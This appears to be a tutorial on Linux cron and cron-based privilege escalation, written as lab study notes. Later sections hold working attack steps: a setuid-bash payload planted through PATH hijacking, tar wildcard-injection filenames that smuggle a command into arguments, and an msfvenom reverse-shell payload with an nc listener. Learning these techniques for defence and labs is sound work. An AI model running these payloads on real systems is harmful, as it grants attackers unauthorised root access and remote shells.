# 1. What Is Cron?

**Cron** is a Linux service used to execute commands or scripts automatically according to a schedule.

Common uses:
- Backups
- Log rotation
- System maintenance
- Database jobs
- Cleanup scripts
- Automated scripts
- Scheduled application tasks
    

The service that runs scheduled jobs is usually called:
```text
cron
```

or:
```text
crond
```

depending on the Linux distribution.

Check whether cron is running:
```bash
systemctl status cron
```

Example:
```text
● cron.service - Regular background program processing daemon
     Loaded: loaded
     Active: active (running)
```

On systems using `crond`:
```bash
systemctl status crond
```

---

# 2. Crontab

**Crontab = Cron Table**

A crontab contains scheduled commands.

View the current user's crontab:
```bash
crontab -l
```

Example:
```text
*/5 * * * * /home/eyad/backup.sh
```

This means:
```text
Every 5 minutes → execute /home/eyad/backup.sh
```

Edit your crontab:
```bash
crontab -e
```

You can also inspect another user's crontab as root:
```bash
crontab -u username -l
```

Example:
```bash
sudo crontab -u root -l
```

Expected:
```text
0 2 * * * /opt/backup.sh
```

This means root executes `/opt/backup.sh` every day at 02:00.

---

# 3. Cron Syntax

A traditional cron entry has five scheduling fields:
```text
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week
│ │ │ └──── Month
│ │ └────── Day of month
│ └──────── Hour
└────────── Minute
```

The fields are:

|Field|Range|
|---|---|
|Minute|`0-59`|
|Hour|`0-23`|
|Day of month|`1-31`|
|Month|`1-12`|
|Day of week|`0-7`|

`0` and `7` commonly represent Sunday.

---

# 4. Cron Operators

## `*` — Every value

```text
* * * * * command
```

Means:
```text
Every minute
```

---

## `,` — Multiple values

```text
0 8,12,18 * * * command
```

Means:
```text
08:00
12:00
18:00
```

every day.

---

## `-` — Range

```text
0 8-17 * * * command
```

Means every hour from:
```text
08:00
09:00
...
17:00
```

---

## `/` — Step

```text
*/5 * * * * command
```

Means:
```text
Every 5 minutes
```

Another example:
```text
*/15 * * * * command
```

Means:
```text
Every 15 minutes
```

---

# 5. Common Cron Examples

### Every minute
```text
* * * * * /opt/script.sh
```

### Every 5 minutes
```text
*/5 * * * * /opt/script.sh
```

### Every hour
```text
0 * * * * /opt/script.sh
```

### Every day at midnight
```text
0 0 * * * /opt/script.sh
```

### Every day at 02:30
```text
30 2 * * * /opt/script.sh
```

### Every Sunday at 03:00
```text
0 3 * * 0 /opt/script.sh
```

### Every Monday-Friday at 08:00
```text
0 8 * * 1-5 /opt/script.sh
```

---

# 6. `/etc/crontab`

There are two important differences between a user's crontab and `/etc/crontab`.

User crontab:
```text
* * * * * command
```

System crontab:
```text
* * * * * USER command
```

Example:
```bash
cat /etc/crontab
```

Expected:
```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Notice the additional field:

```text
17 * * * * root command
             ↑
           USER
```

This tells cron **which user should execute the command**.

---

# 7. Why `/etc/crontab` Matters for PrivEsc

Suppose you discover:
```text
* * * * * root /opt/backup.sh
```

This tells you:
```text
Every minute
     ↓
root
     ↓
/opt/backup.sh
```

The important question becomes:
> **Can my current user modify `/opt/backup.sh`?**

Check:
```bash
ls -l /opt/backup.sh
```

Potentially dangerous output:
```text
-rwxrwxrwx 1 root root 120 Aug 17 14:00 /opt/backup.sh
```

The script is writable by everyone.

The escalation chain is:
```text
Cron
 ↓
root executes backup.sh
 ↓
user can modify backup.sh
 ↓
user controls code executed by root
 ↓
potential privilege escalation
```

---

# 8. `/etc/cron.d`

`/etc/cron.d/` contains additional system cron jobs.

List the directory:
```bash
ls -la /etc/cron.d/
```

Example:
```text
total 20
drwxr-xr-x 1 root root 4096 Aug 17 14:00 .
drwxr-xr-x 1 root root 4096 Aug 17 14:00 ..
-rw-r--r-- 1 root root  150 Aug 17 14:00 backup
-rw-r--r-- 1 root root  180 Aug 17 14:00 cleanup
```

Read a file:
```bash
cat /etc/cron.d/backup
```

Example:
```text
0 * * * * root /opt/backup.sh
```

This means:
```text
Every hour
    ↓
root
    ↓
/opt/backup.sh
```

---

# 9. `/etc/cron.hourly`

Contains scripts intended to run approximately every hour.

Check:
```bash
ls -la /etc/cron.hourly/
```

Example:
```text
-rwxr-xr-x 1 root root 250 Aug 17 14:00 logrotate
-rwxr-xr-x 1 root root 180 Aug 17 14:00 cleanup
```

Inspect a script:
```bash
cat /etc/cron.hourly/cleanup
```

If the script is executed with root privileges, investigate whether:
- The script is writable
- It calls writable programs
- It uses relative paths
- It references writable files
- It loads writable configuration
    

---

# 10. `/etc/cron.daily`

Contains scripts intended to run daily.
```bash
ls -la /etc/cron.daily/
```

Example:
```text
-rwxr-xr-x 1 root root 500 backup
-rwxr-xr-x 1 root root 300 cleanup
```

Inspect:
```bash
cat /etc/cron.daily/backup
```

---

# 11. `/etc/cron.weekly`

Contains weekly scheduled scripts.
```bash
ls -la /etc/cron.weekly/
```

Example:
```text
-rwxr-xr-x 1 root root 350 system-maintenance
```

---

# 12. `/etc/cron.monthly`

Contains monthly scheduled scripts.
```bash
ls -la /etc/cron.monthly/
```

Example:
```text
-rwxr-xr-x 1 root root 300 monthly-backup
```

---

# 13. Finding Cron Jobs

When performing Linux privilege escalation enumeration, check all of these.

### Current user's crontab
```bash
crontab -l
```

### Root's crontab

If permitted:
```bash
sudo crontab -l
```

### System crontab
```bash
cat /etc/crontab
```

### `/etc/cron.d`
```bash
ls -la /etc/cron.d/
```

```bash
cat /etc/cron.d/*
```

### Hourly jobs
```bash
ls -la /etc/cron.hourly/
```

### Daily jobs
```bash
ls -la /etc/cron.daily/
```

### Weekly jobs
```bash
ls -la /etc/cron.weekly/
```

### Monthly jobs
```bash
ls -la /etc/cron.monthly/
```

---

# 14. Search for Cron References

You can search common cron locations:
```bash
grep -R "" /etc/cron* 2>/dev/null
```

Example:
```text
/etc/crontab:* * * * * root /opt/backup.sh
/etc/cron.d/backup:0 * * * * root /opt/backup.sh
```

You can also search for scripts referenced by cron:
```bash
grep -R "/opt/" /etc/cron* 2>/dev/null
```

---

# 15. Writable Cron Scripts

This is one of the most important cron privilege-escalation scenarios.

Suppose:
```bash
cat /etc/crontab
```

returns:
```text
* * * * * root /opt/backup.sh
```

Now:
```bash
ls -l /opt/backup.sh
```

returns:
```text
-rwxrwxrwx 1 root root 150 Aug 17 14:00 /opt/backup.sh
```

The problem is:
```text
Cron executes as root
        +
Script is writable by current user
        =
Potential privilege escalation
```

---

# 16. Checking Every Part of the Path

Don't only check whether the script itself is writable.

Suppose:
```text
/etc/crontab
      ↓
root /opt/scripts/backup.sh
```

Check:
```bash
ls -ld /opt
ls -ld /opt/scripts
ls -l /opt/scripts/backup.sh
```

A parent directory being writable can also be dangerous.

A useful command is:
```bash
namei -l /opt/scripts/backup.sh
```

Example:
```text
f: /opt/scripts/backup.sh
drwxr-xr-x root root /
drwxr-xr-x root root opt
drwxrwxr-x eyad eyad scripts
-rwxr-xr-x root root backup.sh
```

Here:
```text
/opt/scripts
```

is writable by the current user.

That deserves investigation because the user may be able to manipulate files involved in the execution path.

---

# 17. Cron PATH Hijacking

Another important technique is **PATH hijacking**.

Suppose root's cron job contains:
```text
* * * * * root backup
```

Notice:
```text
backup
```

instead of:
```text
/usr/local/bin/backup
```

When Linux executes:
```bash
backup
```

it searches directories in `$PATH`.

First: **What is `$PATH`?**
When you type: `backup` -->  Linux needs to find out **where the `backup` executable is located**.

It doesn't search the entire filesystem.
Instead, it looks through directories listed in:
```bash
echo $PATH
```

Example:
```bash
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

The `:` separates the directories:
```bash
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
```
Linux searches them **from left to right**.

---

# 18. Why PATH Hijacking Can Be Dangerous

Now imagine a privileged cron job:
```bash
* * * * * root backup
```

* Notice that it says:   `backup`
* rather than:   `/usr/bin/backup`
* The system has to search `$PATH` to find `backup`.
* Imagine root's PATH is:  `/opt/tools:/usr/bin:/bin`
	Linux searches:
```text
	/opt/tools
	/usr/bin
	/bin
```

* Suppose the legitimate program is: ` /usr/bin/backup`

* Normally:
```text
/opt/tools/backup    ← doesn't exist
/usr/bin/backup      ← found
```
* So root executes:  `/usr/bin/backup`

Now suppose the directory:   `/opt/tools`  is writable by your low-privileged user.

Check:
```bash
ls -ld /opt/tools
```

Potential output:
```bash
drwxrwxr-x 2 eyad users 4096 Aug 17 14:00 /opt/tools
```

You are the owner:  `eyad`

and therefore can create files there.

Now imagine you place a program named: `/opt/tools/backup`

The next time root's cron job runs:
```text
* * * * * root backup
```

Linux searches:
```text
/opt/tools/backup     ← FOUND FIRST
/usr/bin/backup
/bin/backup
```

Therefore root executes: `/opt/tools/backup`
instead of: `/usr/bin/backup`

That's **PATH hijacking**.

---

# 19. Finding PATH Hijacking Opportunities

###  Find privileged scheduled jobs
For a cron job, inspect:
```bash
cat /etc/crontab
```

Then look at commands executed without absolute paths.

Example:
```text
* * * * * root backup
```

### Identify the command
Investigate where `backup` normally resolves:
```bash
which backup
```
or:
```bash
command -v backup
```
Example:
```text
/usr/bin/backup
```

You now know:
```text
Command:       backup
Normal binary: /usr/bin/backup
```
But **don't stop here**.
You need to determine whether another `backup` could be found first.

### Find the relevant PATH
Look at the cron configuration:
```bash
cat /etc/crontab
```

You might see: `PATH=/opt/tools:/usr/local/bin:/usr/bin:/bin`

Then inspect each PATH directory
	To **Check whether the command is already in an earlier directory**
	 And **Check PATH directories for write permission**
```bash
ls -ld /opt/tools
ls -ld /usr/local/bin
ls -ld /usr/bin
ls -ld /bin
```

now you can privesc
Create a file with same cronjob file name in the path  with the following contents:
```bash
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```bash
/tmp/rootbash -p
```

---

# 21. Relative vs Absolute Paths

### Absolute path
```text
/usr/bin/python3
```

Starts from `/`.
The exact program is specified.

### Relative command
```text
python3
```
Linux must search `$PATH`.

Similarly:
```text
backup
```

is less explicit than:
```text
/usr/local/bin/backup
```

---
# 23. Cron Environment Variables

Cron can define environment variables.

Example:
```text
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
HOME=/root
```

View system cron configuration:
```bash
cat /etc/crontab
```

Important variables include:
```text
SHELL
PATH
HOME
```

When investigating cron, don't assume the environment is identical to your interactive shell.

---

# 24. Privileged Cron Jobs

The most interesting cron jobs during privilege escalation are jobs executed as:
```text
root
```

For example:
```text
* * * * * root /opt/backup.sh
```

But other privileged accounts can also matter:
```text
* * * * * www-data /opt/web-task.sh
```

The important question is:

> **Who executes the job, and what can my current user influence?**

---

# Cron Wildcard Injection

### Wildcard Injection

A **wildcard injection** vulnerability can occur when a cron script passes a wildcard such as `*` to a command without properly handling filenames.

Example:
```bash
tar -czf backup.tar.gz *
```

The shell expands `*` **before** executing `tar`.

If the directory contains:
```text
file1.txt
file2.txt
--checkpoint=1
--checkpoint-action=exec=shell.elf
```

the command effectively becomes something similar to:
```bash
tar -czf backup.tar.gz file1.txt file2.txt --checkpoint=1 --checkpoint-action=exec=shell.elf
```

Because these filenames look like valid `tar` options, `tar` can interpret them as **command-line arguments rather than ordinary filenames**.

### Why This Can Lead to Privilege Escalation

Consider a cron script:

```bash
#!/bin/bash
tar -czf /tmp/backup.tar.gz /home/user/*
```

If this script runs as **root**, but the attacker can create files inside `/home/user/`, the attacker may be able to inject `tar` options through specially crafted filenames.

GNU `tar` provides checkpoint functionality, including options such as:

```text
--checkpoint=1
--checkpoint-action=exec=<command>
```

The second option allows `tar` to execute a command when a checkpoint is reached.

Therefore, if an attacker can influence the files matched by `*`, they may be able to influence the arguments passed to a privileged `tar` process.


### Exploitation Flow

Generate a reverse-shell ELF payload:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

Replace `LHOST` with your Kali machine's IP address.

Transfer the payload to the target and make it executable:
```bash
chmod +x /home/user/shell.elf
```

Create filenames that correspond to `tar` options:
```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

When the cron job executes the wildcard, these filenames can be expanded into the `tar` command as arguments.

Start the listener on Kali:
```bash
nc -nvlp 4444
```

When the cron job executes as root, the payload can connect back and provide a **root shell**.

### Cleanup

After the lab:
```bash
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

This is important because leaving the malicious files behind could cause the cron job to execute the payload again.

### Key Concept

> **The vulnerability is not simply the use of `tar`. The problem is allowing attacker-controlled filenames to become command-line options through an unquoted/unprotected wildcard.**

---

# 25. What Makes a Cron Job Vulnerable?

A cron job becomes interesting when you find a relationship like:
### Case 1 — Writable script
### Case 2 — Writable parent directory
### Case 3 — PATH hijacking
### Case 4 — Writable configuration
### Case 5 — Dangerous relative paths
### Case 6 — Cron Wildcard Injection

---

# 26. Cron Enumeration Checklist

When you get a shell, run:
```bash
crontab -l
```

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.d/
```

```bash
ls -la /etc/cron.hourly/
```

```bash
ls -la /etc/cron.daily/
```

```bash
ls -la /etc/cron.weekly/
```

```bash
ls -la /etc/cron.monthly/
```

Search:
```bash
grep -R "" /etc/cron* 2>/dev/null
```

Check suspicious scripts:
```bash
ls -l /path/to/script
```

Check the entire path:
```bash
namei -l /path/to/script
```

Check whether directories are writable:
```bash
find /path -writable -type d 2>/dev/null
```

---

# 27. Useful Cron Commands — Quick Reference

|Purpose|Command|
|---|---|
|Current crontab|`crontab -l`|
|Edit crontab|`crontab -e`|
|Root crontab|`sudo crontab -l`|
|System cron|`cat /etc/crontab`|
|Cron.d|`ls -la /etc/cron.d/`|
|Hourly|`ls -la /etc/cron.hourly/`|
|Daily|`ls -la /etc/cron.daily/`|
|Weekly|`ls -la /etc/cron.weekly/`|
|Monthly|`ls -la /etc/cron.monthly/`|
|Search cron config|`grep -R "" /etc/cron* 2>/dev/null`|
|Check script permissions|`ls -l /path/script`|
|Check path permissions|`namei -l /path/script`|
|Check cron service|`systemctl status cron`|
|Find writable files|`find / -writable -type f 2>/dev/null`|
|Find writable dirs|`find / -writable -type d 2>/dev/null`|

---

# 28. Cron PrivEsc Methodology

Memorize this:

```text
                Enumerate Cron
                     │
                     ▼
             Find scheduled job
                     │
                     ▼
          Who executes the job?
                     │
             ┌───────┴───────┐
             ▼               ▼
           root          other user
             │
             ▼
       What does it execute?
             │
       ┌─────┼──────┬─────────┐
       ▼     ▼      ▼         ▼
    Script  Binary  Config   PATH
       │     │      │         │
       ▼     ▼      ▼         ▼
   Writable?      Writable?  Writable?
       │
       ▼
 Potential privilege escalation
```

---

# 29. The Most Important Concept

When analyzing a cron job, don't just ask:

> **"Is there a cron job?"**

Ask these five questions:
```text
1. What executes?
2. Who executes it?
3. When does it execute?
4. Can I modify what it executes?
5. Can I influence any files, commands, PATH entries, or configurations it uses?
```

The most important escalation pattern is:
```text
Low-privileged user
        ↓
Can influence cron task
        ↓
Privileged account executes task
        ↓
Attacker-controlled action
        ↓
Higher privileges
```

That is the core idea behind **cron-based Linux privilege escalation**.